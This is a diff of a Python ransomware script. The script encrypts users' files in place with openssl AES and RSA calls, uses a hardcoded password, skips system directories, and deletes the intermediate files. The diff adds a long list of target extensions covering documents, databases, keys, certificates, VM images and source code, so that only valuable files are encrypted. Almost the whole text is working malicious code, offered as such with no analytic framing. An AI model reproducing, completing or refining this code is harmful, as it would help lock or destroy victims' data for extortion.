@@ -4,7 +4,7 @@ import getpass
 aes_password="ricardo"
 pkeyname="public.pem"
 excluded_dirs=["bin","boot","etc","usr","lib","media","dev","usr","sbin","root"]
-
+extensions=['123', 'jpeg', 'rb', '602', 'jpg', 'rtf', 'doc', 'js', 'sch', '3dm', 'jsp', 'sh', '3ds', 'key', 'sldm', '3g2', 'lay', 'sldm', '3gp', 'lay6', 'sldx', '7z', 'ldf', 'slk', 'accdb', 'm3u', 'sln', 'aes', 'm4u', 'snt', 'ai', 'max', 'sql', 'ARC', 'mdb', 'sqlite3', 'asc', 'mdf', 'sqlitedb', 'asf', 'mid', 'stc', 'asm', 'mkv', 'std', 'asp', 'mml', 'sti', 'avi', 'mov', 'stw', 'backup', 'mp3', 'suo', 'bak', 'mp4', 'svg', 'bat', 'mpeg', 'swf', 'bmp', 'mpg', 'sxc', 'brd', 'msg', 'sxd', 'bz2', 'myd', 'sxi', 'c', 'myi', 'sxm', 'cgm', 'nef', 'sxw', 'class', 'odb', 'tar', 'cmd', 'odg', 'tbk', 'cpp', 'odp', 'tgz', 'crt', 'ods', 'tif', 'cs', 'odt', 'tiff', 'csr', 'onetoc2', 'txt', 'csv', 'ost', 'uop', 'db', 'otg', 'uot', 'dbf', 'otp', 'vb', 'dch', 'ots', 'vbs', 'der\xe2\x80\x9d', 'ott', 'vcd', 'dif', 'p12', 'vdi', 'dip', 'PAQ', 'vmdk', 'djvu', 'pas', 'vmx', 'docb', 'pdf', 'vob', 'docm', 'pem', 'vsd', 'docx', 'pfx', 'vsdx', 'dot', 'php', 'wav', 'dotm', 'pl', 'wb2', 'dotx', 'png', 'wk1', 'dwg', 'pot', 'wks', 'edb', 'potm', 'wma', 'eml', 'potx', 'wmv', 'fla', 'ppam', 'xlc', 'flv', 'pps', 'xlm', 'frm', 'ppsm', 'xls', 'gif', 'ppsx', 'xlsb', 'gpg', 'ppt', 'xlsm', 'gz', 'pptm', 'xlsx', 'h', 'pptx', 'xlt', 'hwp', 'ps1', 'xltm', 'ibd', 'psd', 'xltx', 'iso', 'pst', 'xlw', 'jar', 'rar', 'zip', 'java', 'raw']
 
 def create_key():
 	f= open(pkeyname,"w+")
@@ -14,8 +14,7 @@ def create_key():
 
 def encrypt_(fname):
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
-	command=("openssl rsautl -encrypt -pubin -inkey "+pkeyname+" -in "+fname+".aes -out "+fname+".rsa")
-	os.system(command)
+	os.system("openssl rsautl -encrypt -pubin -inkey "+pkeyname+" -in "+fname+".aes -out "+fname+".rsa")
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
 	os.system("rm "+fname+".aes")
 	os.system("rm "+fname+".rsa")
@@ -25,9 +24,10 @@ def encrypt_(fname):
 def enc_files(dir_):
 	onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
 	for f in onlyfiles:
-		file=os.path.join(dir_, f)
-		print "Encrypting",file,"..."
-		encrypt_(file)
+		if f.split(".")[1] in extensions:
+			file=os.path.join(dir_, f)
+			print "Encrypting",file,"..."
+			encrypt_(file)
 
 def loop(looped_dir):
 	create_key()
